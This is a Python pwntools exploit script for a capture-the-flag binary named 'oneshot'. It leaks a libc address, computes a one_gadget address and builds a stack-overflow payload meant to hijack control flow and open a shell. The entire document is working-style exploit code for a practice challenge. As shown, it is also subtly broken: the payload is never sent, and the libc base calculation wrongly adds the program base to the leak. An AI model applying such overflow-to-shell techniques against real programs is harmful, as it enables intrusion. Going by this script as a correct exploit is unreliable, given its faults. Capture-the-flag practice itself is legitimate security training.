from pwn import *

p = process("./oneshot")
libc = ELF("./libc.so.6")

one_offset = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

pie_base = p.libs()['/home/leeminjea/Desktop/sf/dreamhack/oneshot/oneshot']

p.recvuntil("stdout: ")

stdout = int(p.recv(14), 16)
libc.address = pie_base + stdout - libc.symbols["_IO_2_1_stdout_"]
one_gadget = libc.address + one_offset[0]

pay = b""
pay += b"A" * (0x20 - 0x8)
pay += p64(0)
pay += b"B" * 0x8
pay += p64(one_gadget)





p.interactive()